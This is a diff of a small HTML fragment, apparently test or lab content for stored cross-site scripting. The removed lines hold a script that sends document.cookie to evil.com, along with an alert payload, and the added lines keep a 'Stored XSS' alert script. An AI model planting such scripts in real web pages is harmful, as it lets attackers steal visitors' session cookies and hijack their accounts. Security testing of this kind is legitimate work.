@@ -1,10 +1,4 @@
-<p>123
-</p>
-<p>jijiji
-</p>
-<p><script>alert('XSS 成功！')</script>
-</p>
-<p><script>fetch('http://evil.com/steal.php?cookie=' + document.cookie);</script>
-
-</p>
-<p>1212121</p>
+<p>123</p>
+<p>456</p>
+<p><script>alert('Stored XSS')</script></p>
+<p>789</p>
